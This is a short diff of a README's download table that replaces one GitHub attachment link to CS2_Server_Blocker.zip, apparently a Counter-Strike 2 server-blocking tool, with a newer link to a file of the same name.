@@ -5,5 +5,5 @@
 ## DownLoad
 |Download|
 |---|
-|[CS2_Server_Blocker.zip](https://github.com/user-attachments/files/16246621/CS2_Server_Blocker.zip)|
+|[CS2_Server_Blocker.zip](https://github.com/user-attachments/files/16246799/CS2_Server_Blocker.zip)|
 
